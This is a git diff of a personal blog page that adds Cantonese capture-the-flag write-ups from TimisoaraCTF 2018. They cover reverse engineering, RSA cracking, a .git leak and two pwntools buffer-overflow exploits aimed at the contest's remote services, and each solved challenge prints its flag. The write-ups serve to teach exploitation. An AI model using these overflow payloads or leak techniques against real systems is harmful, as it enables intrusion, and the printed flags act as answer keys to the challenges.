@@ -48,9 +48,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://catpawn.github.io"></form>
@@ -60,6 +60,290 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-TimisoaraCTF2018-Pshchology" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-Pshchology/" class="article-date">
+  <time datetime="2018-04-22T15:08:29.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-Pshchology/">TimisoaraCTF2018-Pshchology</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="psychology">psychology</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一野扔入IDA , 之後發現<br><img src="1.jpg" alt=""></p>
+<p>之後扔入photoshop搞搞佢先<br><img src="2.jpg" alt=""></p>
+<p>然後用部手機掃一掃就完事了</p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;eccc61f45045d1e5d052fbba935a5b2d&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Pshchology/" data-id="cjgaye6lx000ffkw5cfza5y7i" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-ForeignLanguage" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-ForeignLanguage/" class="article-date">
+  <time datetime="2018-04-22T14:51:47.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-ForeignLanguage/">TimisoaraCTF2018-ForeignLanguage</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Here&apos;s one of my favorite words:</span><br><span class="line">da&#125;&#125;rilwwe00yt____mfotfysf__11ty11mg__lphyer__tyrt33__algv33uc44nrgely44ys____mvozfpsw__11tv11mf&#123;&#123;letsfmmgcutbic</span><br><span class="line"></span><br><span class="line">Download: [haforli.zip](haforli.zip)</span><br></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一爆開個zip見到有好多python dependency, 咁應該係python script但係用exe pack起左。<br>直接unpack佢先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 python_exe_unpack.py ./haforli.exe</span><br></pre></td></tr></table></figure></p>
+<p>然後拎到個script (原本條script唔係咁既 , d variable用晒oOOooOOooo之類 , 下面係我改過之後既版本)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 2.11.5</span><br><span class="line"># Python bytecode 3.4 (3310)</span><br><span class="line"># Decompiled from: Python 3.4.4 (default, Jan  5 2016, 15:35:18) </span><br><span class="line"># [GCC 5.3.1 20160101]</span><br><span class="line"># Embedded file name: haforli.py</span><br><span class="line"># Compiled at: 2018-04-19 10:18:21</span><br><span class="line"># Size of source mod 2**32: 198 bytes</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">welcomeText = &quot;\n\n              __            _ _ \n  /\\  /\\__ _ / _| ___  _ __| (_)\n / /_/ / _` | |_ / _ \\| &apos;__| | |\n/ __  / (_| |  _| (_) | |  | | |\n\\/ /_/ \\__,_|_|  \\___/|_|  |_|_|\n                                \n&quot;</span><br><span class="line"></span><br><span class="line">ooOO00oOo = lambda OOOo0: (True if len(OOOo0) % 2 == 1 else False)</span><br><span class="line"></span><br><span class="line">def o0O():</span><br><span class="line">    print(&apos;Input an English word to be translated into a Haforli word: &apos;)</span><br><span class="line">    inputWord = raw_input().strip().split(&apos; &apos;)[0]</span><br><span class="line">    reversedWord = inputWord[::-1]</span><br><span class="line">    Ooo = &apos;&apos;</span><br><span class="line">    o0oOoO00o = len(reversedWord) - 1 if ooOO00oOo(reversedWord) else len(reversedWord)</span><br><span class="line">    print o0oOoO00o</span><br><span class="line">    for i in range(0, o0oOoO00o, 2):</span><br><span class="line">        Ooo += reversedWord[i + 1] + reversedWord[i]</span><br><span class="line"></span><br><span class="line">    if ooOO00oOo(reversedWord):</span><br><span class="line">        Ooo += reversedWord[-1]</span><br><span class="line">    print Ooo</span><br><span class="line">    output = &apos;&apos;</span><br><span class="line">    for s in Ooo:</span><br><span class="line">        if not s.isalpha():</span><br><span class="line">            output += s + s</span><br><span class="line">        elif s.isupper():</span><br><span class="line">            output += s + random.choice(string.ascii_uppercase)</span><br><span class="line">        else:</span><br><span class="line">            output += s + random.choice(string.ascii_lowercase)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(&apos;Your translated word: &#123;0&#125;&apos;.format(output))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(welcomeText)</span><br><span class="line">    o0O()</span><br></pre></td></tr></table></figure></p>
+<p>咁就睇應該都係可逆既 , 所以就寫左下面條script解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc)</span>:</span></span><br><span class="line">    enc = enc[::<span class="number">-1</span>]</span><br><span class="line">    tmp = <span class="string">""</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(enc), <span class="number">2</span>):</span><br><span class="line">        tmp += enc[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(tmp), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out += tmp[i+<span class="number">1</span>] + tmp[i]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            out += tmp[i]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"><span class="keyword">print</span> decrypt(<span class="string">"da&#125;&#125;rilwwe00yt____mfotfysf__11ty11mg__lphyer__tyrt33__algv33uc44nrgely44ys____mvozfpsw__11tv11mf&#123;&#123;letsfmmgcutbic"</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;l1m1ts_of_my_l4ngu4g3_ar3_the_l1m1ts_of_my_w0rld&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-ForeignLanguage/" data-id="cjgaye6ls000bfkw5aux4sn7n" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-Attendance" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-Attendance/" class="article-date">
+  <time datetime="2018-04-22T14:49:49.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-Attendance/">TimisoaraCTF2018-Attendance</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="attendance">attendance</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"attendance"</span>)</span><br><span class="line">p = remote(<span class="string">"89.38.210.128"</span>, <span class="number">31337</span>)</span><br><span class="line">vuln_func = <span class="number">0x8048667</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">48</span> + p32(vuln_func)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Call&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"31337"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"please:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Attendance/" data-id="cjgaye6lr000afkw5au17dobb" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-cparty" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-cparty/" class="article-date">
+  <time datetime="2018-04-22T14:40:28.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-cparty/">TimisoaraCTF2018-cparty</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="c_party.zip">c_party.zip</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>睇睇個main先啦<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [sp+58h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+5Ch] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+60h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***^^^ STaR_C_PartY ^^^***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-- Welcome to the party --"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;v1, &amp;v0, <span class="built_in">stdin</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Failed reading user password"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8048800(v1) == <span class="number">-1059127554</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh, you're VIP, here's the special VIP ticket:"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/party/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>sub_8048800<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_8048800(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  const char *s1; // ST18_4@7</span><br><span class="line">  size_t v2; // eax@7</span><br><span class="line">  char *dest; // [sp+48h] [bp-40h]@4</span><br><span class="line">  int v5; // [sp+4Ch] [bp-3Ch]@4</span><br><span class="line">  FILE *stream; // [sp+50h] [bp-38h]@1</span><br><span class="line">  char s; // [sp+54h] [bp-34h]@1</span><br><span class="line">  int v8; // [sp+74h] [bp-14h]@1</span><br><span class="line">  const char *v9; // [sp+78h] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  v9 = a1;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  stream = fopen(&quot;/home/party/orgs_password.txt&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;Failed opening organisers password file&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  dest = 0;</span><br><span class="line">  if ( getline(&amp;dest, &amp;v5, stream) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    perror(&quot;Failed organisers password&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  dest[strcspn(dest, &quot;\n&quot;)] = 0;</span><br><span class="line">  strcpy(&amp;s, v9);</span><br><span class="line">  s1 = dest;</span><br><span class="line">  v2 = strlen(dest);</span><br><span class="line">  if ( !strncmp(s1, &amp;s, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Good password. Now you&apos;ll get your ticket...&quot;);</span><br><span class="line">    puts(&quot;Ticket id: timctf&#123;0112-3581-3213-4558-9144&#125;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad password. No ticket, go home!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  free(dest);</span><br><span class="line">  return v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>似乎我地要做到既野正係需要令到 sub_8048800 既return變做0xC0DEFEFE 就完事<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"89.38.210.128"</span>, <span class="number">31338</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="number">0xc0defefe</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">32</span> + p32(password)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;d0nt_cr4sh_th3_p4rty_b3_th3_p4rty&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-cparty/" data-id="cjgaye6m0000ifkw5ludekjil" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-NotYourAverageRSA" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/" class="article-date">
+  <time datetime="2018-04-22T14:22:11.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/">TimisoaraCTF2018-NotYourAverageRSA</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c: 20318623659277133784436863405159350994457887674343039464217662595169547155252162707757860373904591558880102908865139317161642898188843552485749556428171374190436116308993843078746618097974105761149153341729931060530612128761115767471801348290177493316532913006382242873832659641556157675014368433683567068217</span><br><span class="line">n: 134907508240262137946502074360739103059110939023118055674568339675274978708216465550239395185797633495974788047880328560410956605895894497803797294715631963939546472939054512693762329563642230731635928665937542607055460883018173012233396950213422702996807273870440698007181387418977498579818700406673368084937</span><br></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>直接將 n 扔上factordb發現好多prime<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42125267 · 49833439 · 58693039 · 61513877 · 167006983813971973935755769744287313795624064948679838624701034583661551637974040070265964882467867666872657483049263378360657863549 · 106580625826530329045051134241813132858137977273664192502334106456384150414405388669523053631392655455506681541904952100571943163465502692906512867</span><br></pre></td></tr></table></figure></p>
+<p>醒起有樣野好似叫做 MPRSA (Multi Prime RSA)<br>但係佢好似無比 e 喎 , 咁是但塞住個65537落去試試先</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import gmpy</span><br><span class="line"></span><br><span class="line">def chinese_remainder(n, a):</span><br><span class="line">    sum = 0</span><br><span class="line">    prod = reduce(lambda a, b: a*b, n)</span><br><span class="line"></span><br><span class="line">    for n_i, a_i in zip(n, a):</span><br><span class="line">        p = prod / n_i</span><br><span class="line">        sum += a_i * gmpy.invert(p, n_i) * p</span><br><span class="line">    return sum % prod</span><br><span class="line"></span><br><span class="line">c = 20318623659277133784436863405159350994457887674343039464217662595169547155252162707757860373904591558880102908865139317161642898188843552485749556428171374190436116308993843078746618097974105761149153341729931060530612128761115767471801348290177493316532913006382242873832659641556157675014368433683567068217</span><br><span class="line"></span><br><span class="line">n = 134907508240262137946502074360739103059110939023118055674568339675274978708216465550239395185797633495974788047880328560410956605895894497803797294715631963939546472939054512693762329563642230731635928665937542607055460883018173012233396950213422702996807273870440698007181387418977498579818700406673368084937</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">primes = [</span><br><span class="line">    42125267,</span><br><span class="line">    49833439,</span><br><span class="line">    58693039,</span><br><span class="line">    61513877,</span><br><span class="line">    167006983813971973935755769744287313795624064948679838624701034583661551637974040070265964882467867666872657483049263378360657863549,</span><br><span class="line">    106580625826530329045051134241813132858137977273664192502334106456384150414405388669523053631392655455506681541904952100571943163465502692906512867]</span><br><span class="line"></span><br><span class="line">n_ary = []</span><br><span class="line">a_ary = []</span><br><span class="line">for p in primes:</span><br><span class="line">    phi = p - 1</span><br><span class="line">    d = gmpy.invert(e, phi)</span><br><span class="line">    mk = pow(c, d, p)</span><br><span class="line">    n_ary.append(p)</span><br><span class="line">    a_ary.append(mk)</span><br><span class="line"></span><br><span class="line">m = chinese_remainder(n_ary, a_ary)</span><br><span class="line">flag = (&apos;%x&apos; % m).decode(&apos;hex&apos;)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/" data-id="cjgaye6lv000dfkw5ntdwtm4l" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-Squirrels" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-Squirrels/" class="article-date">
+  <time datetime="2018-04-22T14:10:39.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-Squirrels/">TimisoaraCTF2018-Squirrels</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://squirrels.woodlandhighschool.xyz/" target="_blank" rel="noopener">http://squirrels.woodlandhighschool.xyz/</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>第一步用插件check下有冇.git 洩漏先啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://squirrels.woodlandhighschool.xyz/.git/	              SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/index	          SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/COMMIT_EDITMSG	  SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/config	          SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/description	  SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/HEAD	          SECURITY LEAK!</span><br><span class="line">http://squirrels.woodlandhighschool.xyz/.git/packed-refs	  Well done.</span><br></pre></td></tr></table></figure></p>
+<p>見到咁就用githack clone晒落黎先<br>但係用git log又乜都睇唔到喎 , 咁唯有去番.git到睇下有咩線索啦<br>睇到去 config既時候發現<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion = 0</span><br><span class="line">	filemode = true</span><br><span class="line">	bare = false</span><br><span class="line">	logallrefupdates = true</span><br><span class="line">[user]</span><br><span class="line">	email = squirrels@woodlandhighschool.com</span><br><span class="line">	name = Squirrels</span><br><span class="line">[remote &quot;fork&quot;]</span><br><span class="line">	url = http://git.woodlandhighschool.xyz/squirrels</span><br><span class="line">	fetch = +refs/heads/*:refs/remotes/fork/*</span><br></pre></td></tr></table></figure></p>
+<p>原來呢個site係fork落黎 , main repo係<a href="http://git.woodlandhighschool.xyz/squirrels" target="_blank" rel="noopener">http://git.woodlandhighschool.xyz/squirrels</a><br>去到一睇點知係空白架喎 , 咁又唯有githack下佢啦<br>發現有個commit 既desciption係add flag , 咁checkout落黎睇睇先<br><img src="1.png" alt=""><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat index.html | grep tim</span><br></pre></td></tr></table></figure></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;g1t_w1z4rd_1n_w00dl4and_h1ghsch00l&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Squirrels/" data-id="cjgaye6ly000gfkw5xjuxpnfr" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TimisoaraCTF2018-BookDir1-2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
